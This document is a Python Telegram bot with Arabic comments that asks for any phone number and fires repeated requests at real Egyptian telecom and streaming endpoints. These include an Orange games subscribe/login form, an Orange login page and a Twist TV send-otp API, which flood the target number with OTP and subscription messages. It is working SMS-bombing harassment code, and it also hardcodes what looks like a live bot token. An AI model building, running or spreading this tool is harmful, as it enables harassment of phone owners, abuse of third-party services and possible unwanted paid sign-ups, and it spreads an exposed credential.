import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
import requests
from bs4 import BeautifulSoup
import threading
import time
import json

# استبدل 'YOUR_BOT_TOKEN' بـ token البوت الخاص بك
bot = telebot.TeleBot('8759522486:AAHfUEiwijT8N2WdL9WbRCDk8gXor_Ka-IM')

# قاموس لتخزين أرقام الهواتف والحالات للمستخدمين
user_data = {}

# وظيفة لإنشاء لوحة المفاتيح الرئيسية
def create_main_keyboard():
    keyboard = ReplyKeyboardMarkup(resize_keyboard=True)
    keyboard.add(KeyboardButton('اورانج🍊'), KeyboardButton('اتصالات💚'))
    keyboard.add(KeyboardButton('فودافون♥️'), KeyboardButton('وي💜'))
    return keyboard

# وظيفة لإنشاء لوحة مفاتيح قسم أورانج
def create_orange_keyboard():
    keyboard = ReplyKeyboardMarkup(resize_keyboard=True)
    keyboard.add(KeyboardButton('اورانج¹'), KeyboardButton('اورانج²'), KeyboardButton('اورانج³'))
    keyboard.add(KeyboardButton('🔙 الرجوع للقائمة الرئيسية'))
    return keyboard

# وظيفة لإنشاء لوحة مفاتيح قسم اتصالات
def create_etisalat_keyboard():
    keyboard = ReplyKeyboardMarkup(resize_keyboard=True)
    keyboard.add(KeyboardButton('اتصالات¹'))
    keyboard.add(KeyboardButton('🔙 الرجوع للقائمة الرئيسية'))
    return keyboard

# وظيفة لإنشاء لوحة مفاتيح قسم فودافون
def create_vodafone_keyboard():
    keyboard = ReplyKeyboardMarkup(resize_keyboard=True)
    keyboard.add(KeyboardButton('فودافون¹'))
    keyboard.add(KeyboardButton('🔙 الرجوع للقائمة الرئيسية'))
    return keyboard

# وظيفة لإنشاء لوحة مفاتيح قسم وي
def create_we_keyboard():
    keyboard = ReplyKeyboardMarkup(resize_keyboard=True)
    keyboard.add(KeyboardButton('وي¹'))
    keyboard.add(KeyboardButton('🔙 الرجوع للقائمة الرئيسية'))
    return keyboard

# معالج الأمر /start
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_data[message.chat.id] = {'phone': None, 'state': 'main'}
    bot.send_message(message.chat.id, "مرحباً! اختر أحد الأقسام:", reply_markup=create_main_keyboard())

# معالج الرسائل النصية
@bot.message_handler(func=lambda message: True)
def handle_message(message):
    chat_id = message.chat.id
    text = message.text
    
    # تهيئة بيانات المستخدم إذا لم تكن موجودة
    if chat_id not in user_data:
        user_data[chat_id] = {'phone': None, 'state': 'main'}
    
    user_state = user_data[chat_id]['state']
    user_phone = user_data[chat_id]['phone']

    if user_state == 'waiting_for_phone':
        process_phone_number(message)
        return

    if text == 'اورانج🍊':
        user_data[chat_id]['state'] = 'orange'
        bot.send_message(chat_id, "اختر من قائمة أورانج:", reply_markup=create_orange_keyboard())
    
    elif text == 'اتصالات💚':
        user_data[chat_id]['state'] = 'etisalat'
        bot.send_message(chat_id, "اختر من قائمة اتصالات:", reply_markup=create_etisalat_keyboard())
    
    elif text == 'فودافون♥️':
        user_data[chat_id]['state'] = 'vodafone'
        bot.send_message(chat_id, "اختر من قائمة فودافون:", reply_markup=create_vodafone_keyboard())
    
    elif text == 'وي💜':
        user_data[chat_id]['state'] = 'we'
        bot.send_message(chat_id, "اختر من قائمة وي:", reply_markup=create_we_keyboard())
    
    elif text == '🔙 الرجوع للقائمة الرئيسية':
        user_data[chat_id]['state'] = 'main'
        bot.send_message(chat_id, "العودة للقائمة الرئيسية:", reply_markup=create_main_keyboard())
    
    elif text == 'اورانج¹':
        if user_phone is None:
            user_data[chat_id]['state'] = 'waiting_for_phone'
            user_data[chat_id]['next_action'] = 'orange1'
            bot.send_message(chat_id, "أرسل رقم الهاتف:")
        else:
            send_orange1_requests(chat_id, user_phone)
    
    elif text == 'اورانج²':
        if user_phone is None:
            user_data[chat_id]['state'] = 'waiting_for_phone'
            user_data[chat_id]['next_action'] = 'orange2'
            bot.send_message(chat_id, "أرسل رقم الهاتف:")
        else:
            send_orange2_requests(chat_id, user_phone)
    
    elif text == 'اورانج³':
        if user_phone is None:
            user_data[chat_id]['state'] = 'waiting_for_phone'
            user_data[chat_id]['next_action'] = 'orange3'
            bot.send_message(chat_id, "أرسل رقم الهاتف:")
        else:
            send_orange3_requests(chat_id, user_phone)
    
    elif text == 'اتصالات¹':
        if user_phone is None:
            user_data[chat_id]['state'] = 'waiting_for_phone'
            user_data[chat_id]['next_action'] = 'etisalat1'
            bot.send_message(chat_id, "أرسل رقم الهاتف:")
        else:
            send_etisalat1_requests(chat_id, user_phone)
    
    elif text == 'فودافون¹':
        if user_phone is None:
            user_data[chat_id]['state'] = 'waiting_for_phone'
            user_data[chat_id]['next_action'] = 'vodafone1'
            bot.send_message(chat_id, "أرسل رقم الهاتف:")
        else:
            send_vodafone1_requests(chat_id, user_phone)
    
    elif text == 'وي¹':
        if user_phone is None:
            user_data[chat_id]['state'] = 'waiting_for_phone'
            user_data[chat_id]['next_action'] = 'we1'
            bot.send_message(chat_id, "أرسل رقم الهاتف:")
        else:
            send_we1_requests(chat_id, user_phone)

# معالج لاستقبال رقم الهاتف
def process_phone_number(message):
    chat_id = message.chat.id
    phone = message.text
    
    # تحقق من صحة رقم الهاتف
    if not phone.isdigit() or len(phone) < 10:
        bot.send_message(chat_id, "رقم هاتف غير صالح. أرسل رقم هاتف صحيح:")
        return
    
    user_data[chat_id]['phone'] = phone
    user_data[chat_id]['state'] = 'main'
    
    next_action = user_data[chat_id].get('next_action', None)
    
    if next_action == 'orange1':
        send_orange1_requests(chat_id, phone)
    elif next_action == 'orange2':
        send_orange2_requests(chat_id, phone)
    elif next_action == 'orange3':
        send_orange3_requests(chat_id, phone)
    elif next_action == 'etisalat1':
        send_etisalat1_requests(chat_id, phone)
    elif next_action == 'vodafone1':
        send_vodafone1_requests(chat_id, phone)
    elif next_action == 'we1':
        send_we1_requests(chat_id, phone)
    else:
        bot.send_message(chat_id, f"تم حفظ رقم الهاتف: {phone}")

# وظيفة لإرسال طلبات أورانج¹
def send_orange1_requests(chat_id, phone):
    bot.send_message(chat_id, "جاري إرسال طلبات أورانج¹...")
    
    def send_requests():
        for i in range(10):
            try:
                headers = {
                    'authority': 'orangegamesplus.com',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'ar-AE,ar-EG;q=0.9,ar;q=0.8,en-GB;q=0.7,en;q=0.6,en-US;q=0.5',
                    'cache-control': 'max-age=0',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://orangegamesplus.com',
                    'referer': 'https://orangegamesplus.com/User/Index?Lang=2',
                    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Android"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
                }

                params = {'Lang': '2'}
                data = {'n': phone}

                response = requests.post('https://orangegamesplus.com/User/SubscribeOrLogin', 
                                        params=params, headers=headers, data=data)
                
                if response.status_code == 200:
                    bot.send_message(chat_id, f"تم الطلب {i+1} من أورانج¹ بنجاح")
                else:
                    bot.send_message(chat_id, f"فشل الطلب {i+1} من أورانج¹")
                
                time.sleep(2)  # تأخير بين الطلبات
                
            except Exception as e:
                bot.send_message(chat_id, f"حدث خطأ في الطلب {i+1}: {str(e)}")
        
        bot.send_message(chat_id, "اكتملت جميع طلبات أورانج¹")
    
    # تشغيل الطلبات في thread منفصل لتجنب تجميد البوت
    thread = threading.Thread(target=send_requests)
    thread.start()

# وظيفة لإرسال طلبات أورانج²
def send_orange2_requests(chat_id, phone):
    bot.send_message(chat_id, "جاري إرسال طلبات أورانج²...")
    
    def send_requests():
        for i in range(10):
            try:
                session = requests.Session()
                login_url = 'http://oleorange.com/login'

                headers = {    
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',    
                    'Accept-Language': 'ar-AE,ar-EG;q=0.9,ar;q=0.8,en-GB;q=0.7,en;q=0.6,en-US;q=0.5',    
                    'Cache-Control': 'max-age=0',    
                    'Connection': 'keep-alive',    
                    'Referer': login_url,    
                    'Upgrade-Insecure-Requests': '1',    
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',    
                }    

                # 1) جلب صفحة تسجيل الدخول لالتقاط الكوكيز والحقول المخفية
                resp = session.get(login_url, headers=headers)    
                resp.raise_for_status()    

                soup = BeautifulSoup(resp.text, 'html.parser')    

                # 2) جمع كل الحقول المخفية الموجودة في الصفحة
                hidden_inputs = {tag.get('name'): tag.get('value', '')     
                                for tag in soup.find_all('input', {'type': 'hidden'}) if tag.get('name')}    

                # 3) تجهيز بيانات الـ form مع الحقل رقم التليفون وزر الدخول    
                data = {    
                    '__LASTFOCUS': '',    
                    '__EVENTTARGET': '',    
                    '__EVENTARGUMENT': '',    
                    **hidden_inputs,    
                    'txtPhone': phone,    
                    'btnLogin': 'الدخول',    
                }    

                # 4) إرسال POST عبر نفس الجلسة
                post_resp = session.post(login_url, headers=headers, data=data, allow_redirects=True)    
                
                if post_resp.status_code == 200:
                    bot.send_message(chat_id, f"تم الطلب {i+1} من أورانج² بنجاح")
                else:
                    bot.send_message(chat_id, f"فشل الطلب {i+1} من أورانج²")
                
                time.sleep(2)  # تأخير بين الطلبات
                
            except Exception as e:
                bot.send_message(chat_id, f"حدث خطأ في الطلب {i+1}: {str(e)}")
        
        bot.send_message(chat_id, "اكتملت جميع طلبات أورانج²")
    
    # تشغيل الطلبات في thread منفصل
    thread = threading.Thread(target=send_requests)
    thread.start()

# وظيفة لإرسال طلبات أورانج³ (نفس اتصالات¹)
def send_orange3_requests(chat_id, phone):
    send_etisalat1_requests(chat_id, phone, "أورانج³")

# وظيفة لإرسال طلبات اتصالات¹
def send_etisalat1_requests(chat_id, phone, service_name="اتصالات¹"):
    bot.send_message(chat_id, f"جاري إرسال طلبات {service_name}...")
    
    def send_requests():
        for i in range(10):
            try:
                url = "https://ev-api.aws.playco.com/api/v1.0/eg/twist/send-otp"

                payload = {
                    "phoneNumber": f"2{phone}"
                }

                headers = {
                    'User-Agent': "Twist TV/StarzAPP(com.twist.tv;build:2032;Android:12)",
                    'Connection': "Keep-Alive",
                    'Accept': "application/json",
                    'Accept-Encoding': "gzip",
                    'Content-Type': "application/json",
                    'Content-Type': "application/json; charset=UTF-8",
                    'Client-Type': "Android",
                    'X-TRACKER-ID': "",
                    'X-APP-AD-ID': ""
                }

                response = requests.post(url, data=json.dumps(payload), headers=headers)

                if response.status_code == 200:
                    bot.send_message(chat_id, f"تم الطلب {i+1} من {service_name} بنجاح")
                else:
                    bot.send_message(chat_id, f"فشل الطلب {i+1} من {service_name}")
                
                time.sleep(2)  # تأخير بين الطلبات
                
            except Exception as e:
                bot.send_message(chat_id, f"حدث خطأ في الطلب {i+1}: {str(e)}")
        
        bot.send_message(chat_id, f"اكتملت جميع طلبات {service_name}")
    
    # تشغيل الطلبات في thread منفصل
    thread = threading.Thread(target=send_requests)
    thread.start()

# وظيفة لإرسال طلبات فودافون¹ (نفس اتصالات¹)
def send_vodafone1_requests(chat_id, phone):
    send_etisalat1_requests(chat_id, phone, "فودافون¹")

# وظيفة لإرسال طلبات وي¹ (نفس اتصالات¹)
def send_we1_requests(chat_id, phone):
    send_etisalat1_requests(chat_id, phone, "وي¹")

# بدء تشغيل البوت
if __name__ == '__main__':
    print("تم تشغيل البوت...")
    bot.polling(none_stop=True)
